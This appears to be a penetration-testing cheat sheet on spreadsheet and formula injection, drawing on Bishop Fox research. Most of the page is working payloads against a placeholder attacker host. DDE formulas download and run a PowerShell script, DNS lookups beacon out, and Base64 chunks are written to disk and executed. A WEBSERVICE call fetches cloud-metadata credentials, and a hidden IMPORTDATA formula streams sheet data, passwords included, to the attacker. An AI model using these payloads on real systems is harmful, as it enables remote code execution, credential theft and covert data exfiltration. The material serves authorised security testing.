---
tags:
  - Web
---

# :material-file-table: Spreadsheet / Formula Injection

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-medium">exfil</span> <span class="pill pill-info">web</span>

Anywhere your input ends up in a spreadsheet cell, it may be read as a **formula**
instead of text. Classically that fired on the victim's desktop when they opened
an export. The interesting version is when the **server** evaluates it — file
conversion, report rendering and "export to XLSX" pipelines all run a spreadsheet
engine backend-side, turning a client-side nuisance into SSRF, file read and RCE.

!!! abstract "TL;DR"
    Inject a formula, prove the backend evaluates it with `=SUM(1,1)`, then escalate:
    `=WEBSERVICE()` for SSRF and egress mapping, `=cmd|'…'!A1` (DDE) for RCE, and
    `IMPORTDATA()` for exfil on cloud spreadsheets.

*Server-side cases and payloads from ["Server-Side Spreadsheet Injections"](https://bishopfox.com/blog/server-side-spreadsheet-injections) by Bishop Fox.*

## :material-target: Where to look

- **Export → re-import flows** — bulk user/product CSV exports an admin edits and uploads back.
- **File-conversion services** — XLS/CSV → PDF/image, often instrumented Excel or LibreOffice on a Windows box.
- **Report/invoice generators** that build a workbook from user-supplied fields.
- **Any field that reaches a cell**: name, description, address, notes, filename, even a header value logged into a sheet.

## :material-account-arrow-right: Client-side (classic CSV injection)

The original bug: the export is plain text, but Excel/LibreOffice treats a cell
starting with one of these as a formula when the victim opens it.

```text
=   +   -   @   TAB   CR
```

```text
=cmd|'/c calc'!A1
@SUM(1+1)*cmd|'/c calc'!A1
=HYPERLINK("http://$ATTACKER/?d="&A1,"Click me")
```

!!! bug "This is a real finding even with no server-side eval"
    Impact is code execution on whoever opens the export — frequently an admin or
    finance user, i.e. exactly the account you want. It's often dismissed as
    "user must click through warnings", so lead the report with the DDE prompt
    chain, not the `calc` popup.

## :material-magnify-scan: Prove the server evaluates formulas

Before throwing anything heavy, confirm the backend actually computes cells.
Upload, convert, and read the output:

```text
=SUM(1,1)      → renders 2      = the server evaluated it
=NOW()         → a live timestamp = real-time evaluation, not a cached value
=1+1           → 2
```

Then learn the execution context — this is what tells you where you can write:

```text
=INFO("directory")      → the working directory
=INFO("osversion")      → platform, so you know if DDE is on the table
=CELL("filename")       → full path of the workbook being processed
```

!!! loot "A returned `2` changes the whole engagement"
    Client-side formula injection is a medium at best. A server-evaluated `=NOW()`
    means you have code running on their infrastructure — reprioritise
    immediately and go for `=WEBSERVICE` then DDE.

## :material-server-network: SSRF & egress mapping

`WEBSERVICE()` makes the spreadsheet engine issue the request for you. Fire it at
your own host first to confirm, then use it to map what the box can reach:

```text
=WEBSERVICE("http://$ATTACKER")
=WEBSERVICE("https://$ATTACKER")
=WEBSERVICE("http://dnstest.$ATTACKER")
```

Which of those land tells you the firewall's shape — HTTP out, HTTPS out, or DNS
only. From there it's an ordinary SSRF: point it at internal hosts and at
`169.254.169.254` for [cloud metadata](../cloud/aws.md), and pull the response
into a cell so a blind fetch becomes readable output.

```text
=WEBSERVICE("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
```

## :material-fire: RCE via DDE

Dynamic Data Exchange lets a cell launch a local process. On a Windows conversion
server running instrumented Excel, that's a shell:

```text
=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString("http://$ATTACKER/shell.ps1");powershell -e $e'!A1
```

Confirm execution first if you're blind — resolve a hostname you control so the
lookup proves it ran even with no HTTP egress:

```text
=CMD|'/c for /f "delims=" %a in ('hostname') do nslookup %a.$ATTACKER '|!A0
=CMD|'/c powershell nslookup dnstest.17.$ATTACKER'|!A1
```

Pair with Metasploit's `exploit/multi/script/web_delivery` for the stager when
HTTP egress does exist.

## :material-dns: Blind exfil over DNS, past the 255-char limit

DDE string literals cap around **255 characters** — too small for a real payload.
Split a Base64 blob into chunks, `echo` each one into a file in a writable
directory (the one `=INFO("directory")` gave you), then decode and run it:

```text
=cmd|'/C echo|set /p="JHVybCA9ICJiaXNob3Bmb3guY29tIjtmdW5jdGlvbiBleGVjRE5TKA==" > C:\ProgramData\<app>\Temp\a.enc'!A0
+cmd|'/C echo|set /p="ACQAYwBtAGQAKQAgAHsACgAkAGMAIAA9ACAAaQBlAHgAIAAkAGMAbQBkACAAMgA+ACYAMQAgAHwAIABPAHV0LVN0cmkA" >> C:\ProgramData\<app>\Temp\a.enc'!A0
```

- First chunk uses `>` (create), **every subsequent chunk uses `>>`** (append) — repeat until the whole blob is on disk.
- `set /p=` writes without a trailing newline, so the chunks rejoin into one valid Base64 string.
- Note the leading `+` on continuation rows: a second formula in a second cell.

Then assemble and execute:

```text
+cmd|'/C powershell -c "$a=Get-Content C:\ProgramData\<app>\Temp\a.enc;powershell -e $a"'!A0
```

With TCP egress blocked, run a DNS-only shell (SensePost's PowerShell DNS Shell)
so command output leaves over resolution alone. `CertUtil.exe -decode` is the
alternative if you'd rather decode on disk than in PowerShell.

## :material-cloud-download: Cloud spreadsheets — live exfil

Google Sheets has no data-exfiltration protection: a formula in an imported sheet
can stream cell contents to you, and **recalculates whenever the referenced cells
change**, so it keeps leaking as the sheet is used.

```text
=IFERROR(IMPORTDATA(CONCAT("http://$ATTACKER:8000/save/",JOIN(",",B3:B18,C3:C18,D3:D18,E3:E18,F3:F18,G3:G18,H3:H18,I3:I18,J3:J18,K3:K18,L3:L18,M3:M18,N3:N18,O3:O18,P3:P18,Q3:Q18,R3:R18))),"")
```

- `JOIN` flattens the ranges into one string, `CONCAT` glues it onto your URL, `IMPORTDATA` performs the fetch.
- `IFERROR(...,"")` keeps the cell visually empty so nobody notices.
- Widen the ranges to cover the whole sheet; an admin export of a user list often carries **initial passwords**.

!!! opsec "It re-fires on every recalculation"
    That's the win and the risk: you get live updates, but you also generate
    repeated outbound requests from the victim's session for as long as the sheet
    exists. Expect it in logs.

## :material-link-variant: Related

- Server-evaluated fetches are ordinary [SSRF](ssrf.md) once you have `=WEBSERVICE` — and the road to [cloud metadata](../cloud/aws.md).
- Same shape in a different renderer: [PDF/HTML renderers → SSRF → LFI](ssrf.md#pdf-html-renderers-ssrf-lfi).
- DDE lands you in [Command Injection](command-injection.md) territory → [Windows Privesc](../privesc/windows.md).
- Upload-driven variants → [File Upload](file-upload.md).
- Source: [Bishop Fox — Server-Side Spreadsheet Injections](https://bishopfox.com/blog/server-side-spreadsheet-injections).
